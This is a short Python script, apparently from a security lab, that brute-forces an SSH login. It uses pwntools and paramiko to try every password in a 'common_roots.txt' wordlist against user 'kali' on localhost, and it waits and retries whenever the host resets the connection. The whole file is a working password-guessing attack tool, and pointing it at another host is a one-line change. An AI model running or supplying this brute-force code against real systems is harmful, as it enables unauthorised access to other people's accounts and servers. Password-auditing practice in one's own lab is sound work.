from pwn import *
import paramiko

def main():

    host = "127.0.0.1"
    username = "kali"
    attempts = 0
    valid = False

    with open("common_roots.txt", "r" ) as password_list:
        for password in password_list:
            password = password.strip("\n")

            # Do not move to next password if connection was reset by Host
            while valid is False:
                try:
                    print("[{}] Attempting password: '{}'!".format(attempts, password))
                    response = ssh(host=host, user=username, password=password, timeout=1)
                    if response.connected():
                        print("[>] Valid password found: '{}'!".format(password))
                        response.close()
                        valid = True
                        break
                    response.close()
                    break
                except paramiko.ssh_exception.AuthenticationException:
                    print("[X] Invalid password!")
                    attempts += 1
                    break
                except Exception as e:
                    print("{} \nConnection closed by host, resetting".format(e))
                    # Reset connection & reattempt password
                    timer(30)

            if valid is True:
                break

def timer(seconds):
    for i in range(0, seconds):
        time.sleep(1)
        sys.stdout.write("{} [{}{}]\r".format(i, '#'*i, "."*(seconds-i)))
        sys.stdout.flush()
    sys.stdout.write("\n")

if __name__ == "__main__":
    main()